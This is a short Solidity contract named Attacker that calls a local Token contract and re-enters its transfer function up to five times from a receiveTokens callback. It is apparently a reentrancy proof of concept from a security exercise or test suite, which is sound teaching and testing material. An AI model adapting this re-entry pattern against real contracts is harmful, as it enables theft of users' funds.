// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Token.sol";

contract Attacker {
    Token public token;
    uint256 public count;

    constructor(address _token) {
        token = Token(_token);
    }

    function attack() external {
        token.transfer(address(this), 1);
    }

    function receiveTokens(uint256 amount) external {
        if (count < 5) {
            count++;
            token.transfer(address(this), amount);
        }
    }
}